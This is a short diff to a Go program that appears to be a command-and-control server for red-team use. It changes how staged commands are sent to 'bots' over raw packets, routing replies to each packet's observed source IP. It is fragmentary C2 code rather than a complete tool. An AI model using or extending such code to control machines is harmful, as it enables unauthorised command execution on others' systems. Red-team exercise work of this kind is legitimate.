@@ -24,6 +24,7 @@ type Host struct {
 	Hostname string
 	Mac      net.HardwareAddr
 	IP       net.IP
+	RespIP   net.IP
 }
 
 // PwnBoard is used for updating pwnboard
@@ -48,7 +49,7 @@ func sendCommand(iface *net.Interface, myIP net.IP, dstMAC net.HardwareAddr, lis
 			fmt.Println("DST MAC:", dstMAC)
 			fmt.Println("SRC IP:", myIP)
 			fmt.Println("DST IP:", bot.IP)
-			packet := cattails.CreatePacket(iface, myIP, bot.IP, dstMAC, cattails.CreateCommand(stagedCmd))
+			packet := cattails.CreatePacket(iface, myIP, bot.RespIP, dstMAC, cattails.CreateCommand(stagedCmd))
 			// YEET
 			cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)
 
@@ -69,7 +70,7 @@ func serverProcessPacket(packet gopacket.Packet, listen chan Host) {
 	data := string(packet.ApplicationLayer().Payload())
 	payload := strings.Split(data, " ")
 
-	fmt.Println("PACKET SRC IP", packet.NetworkLayer().NetworkFlow().Src().String())
+	// fmt.Println("PACKET SRC IP", packet.NetworkLayer().NetworkFlow().Src().String())
 
 	// Parse the values from the data
 	mac, err := net.ParseMAC(payload[2])
@@ -83,6 +84,7 @@ func serverProcessPacket(packet gopacket.Packet, listen chan Host) {
 		Hostname: payload[1],
 		Mac:      mac,
 		IP:       net.ParseIP(payload[3]),
+		RespIP:   net.ParseIP(packet.NetworkLayer().NetworkFlow().Src().String()),
 	}
 
 	// fmt.Println("[+] Recieved From:", newHost.Hostname, "(", newHost.IP, ")")
